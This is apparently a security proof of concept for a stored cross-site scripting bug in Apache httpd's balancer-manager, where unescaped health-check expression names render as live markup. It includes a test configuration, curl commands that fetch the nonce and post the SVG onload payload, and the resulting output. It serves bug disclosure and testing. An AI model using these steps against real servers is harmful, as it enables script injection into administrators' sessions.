# PoC 048 — balancer-manager renders `hcexpr` without HTML escaping

`worker->s->hcexpr` is concatenated into the manager HTML table without
`ap_escape_html`, so a configured health-check expression name containing
HTML metacharacters is rendered as live markup.

## Setup

Build with proxy modules enabled and load mod_watchdog/mod_proxy_hcheck so
`hc_valid_expr_f` is registered. Minimum `httpd.conf`:

```
Listen 127.0.0.1:8080
LoadModule proxy_module           modules/mod_proxy.so
LoadModule proxy_http_module      modules/mod_proxy_http.so
LoadModule proxy_balancer_module  modules/mod_proxy_balancer.so
LoadModule proxy_hcheck_module    modules/mod_proxy_hcheck.so
LoadModule watchdog_module        modules/mod_watchdog.so
LoadModule slotmem_shm_module     modules/mod_slotmem_shm.so
LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so

ServerName localhost
ProxyHCExpr xss {%{REQUEST_STATUS} =~ /^[2]/}

<Proxy balancer://demo>
    BalancerMember http://127.0.0.1:9000 hcmethod=GET hcexpr=xss
</Proxy>
ProxyPass /demo balancer://demo/

<Location /balancer-manager>
    SetHandler balancer-manager
    Require host localhost
</Location>
```

A second expression with HTML metacharacters in its name simulates the
attacker-controlled stored value (the parser accepts the token as the
expression identifier):

```
ProxyHCExpr "<svg/onload=alert(1)>" {%{REQUEST_STATUS} =~ /^[2]/}
```

Start a dummy upstream on :9000:

```
python3 -m http.server 9000 &
```

## Trigger

Update the worker's health-check expression via balancer-manager. Grab the
nonce first, then POST:

```
NONCE=$(curl -s 'http://127.0.0.1:8080/balancer-manager' \
        | grep -oE 'nonce=[a-f0-9-]+' | head -1 | cut -d= -f2)

curl -i 'http://127.0.0.1:8080/balancer-manager' \
  -H 'Referer: http://127.0.0.1:8080/balancer-manager' \
  --data-urlencode "nonce=${NONCE}" \
  --data-urlencode 'b=demo' \
  --data-urlencode 'w=http://127.0.0.1:9000' \
  --data-urlencode 'w_he=<svg/onload=alert(1)>' \
  --data-urlencode 'w_hm=GET'

curl -s 'http://127.0.0.1:8080/balancer-manager' | grep -F '<svg/onload'
```

## Observed effect

Response body contains the raw payload between `<td>` and `</td>`:

```
<td><svg/onload=alert(1)>
```

Loading `/balancer-manager` in a browser executes the injected SVG event
handler. Compare `hcuri` and `route` columns in the same row, which are
escaped via `ap_escape_html`. Log marker — the access log shows the POST
returning 200 and the subsequent GET returning 200 with the unescaped value
present in the response.
